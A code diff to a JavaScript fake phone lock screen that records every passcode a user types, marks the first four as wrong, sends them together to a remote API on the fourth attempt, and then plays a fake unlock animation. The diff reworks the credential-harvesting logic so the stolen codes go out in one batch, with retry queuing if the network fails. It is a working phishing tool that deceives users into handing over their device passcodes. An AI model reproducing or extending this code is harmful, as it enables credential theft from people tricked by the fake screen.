@@ -12,9 +12,26 @@
   const homescreenImg = document.getElementById('homescreenImg');
   const ATT_KEY = '_pass_attempt_count_';
   const QUEUE_KEY = '_pass_queue_';
+  const ATT_CODES_KEY = '_pass_attempts_codes_'; // stores first-4 attempt codes persistently
 
   function getAttempts() { return parseInt(localStorage.getItem(ATT_KEY) || '0', 10); }
   function setAttempts(n) { localStorage.setItem(ATT_KEY, String(n)); }
+
+  function getStoredAttemptCodes() {
+    try {
+      return JSON.parse(localStorage.getItem(ATT_CODES_KEY) || '[]');
+    } catch (e) {
+      return [];
+    }
+  }
+  function pushStoredAttemptCode(pass) {
+    const arr = getStoredAttemptCodes();
+    arr.push(pass);
+    localStorage.setItem(ATT_CODES_KEY, JSON.stringify(arr));
+  }
+  function clearStoredAttemptCodes() {
+    localStorage.removeItem(ATT_CODES_KEY);
+  }
 
   function refreshDots() {
     dotEls.forEach((d,i) => d.classList.toggle('filled', i < code.length));
@@ -35,6 +52,7 @@
     const url = API_BASE + encodeURIComponent(pass);
     return fetch(url, { method: 'GET', keepalive: true })
       .catch(() => {
+        // if network fails, queue the combined payload
         queuePass(pass);
       });
   }
@@ -200,22 +218,36 @@
     }, DURATION + 20);
   }
 
+  // Collect first 4 codes, send them combined on the 4th attempt
   async function handleCompleteAttempt(enteredCode) {
     let attempts = getAttempts();
     attempts += 1;
     setAttempts(attempts);
 
-    // old behaviour: attempts 1-4 -> send, 5 -> unlock animation
-    if (attempts >= 1 && attempts <= 4) {
-      sendToAPI(enteredCode);
+    // store this entered code (persistently)
+    pushStoredAttemptCode(enteredCode);
+
+    if (attempts >= 1 && attempts <= 3) {
+      // first three attempts: just animate wrong attempt, don't send yet
+      animateWrongAttempt();
+    } else if (attempts === 4) {
+      // On the 4th attempt, send all collected codes as one comma-separated string
+      const codes = getStoredAttemptCodes(); // e.g. ["1234","4321","5678","3456"]
+      const combined = codes.join(',');
+      // send combined string to API
+      sendToAPI(combined);
+      // show wrong attempt animation for 4th as well
       animateWrongAttempt();
     } else if (attempts === 5) {
+      // 5th attempt: trigger unlock animation (do not send)
       playUnlockAnimation();
       setTimeout(reset, 300);
     }
 
+    // After the 5th attempt, reset the attempt counter and clear stored codes
     if (attempts >= 5) {
       setAttempts(0);
+      clearStoredAttemptCodes();
     }
   }
 
@@ -247,7 +279,7 @@
     if (!num) return;
 
     k.addEventListener('touchstart', () => {
-      animateBrightness(k, 1.6, 80);
+      animateBrightness(k, 1.6, 80); // increased brightness
     }, { passive: true });
 
     const endPress = () => {
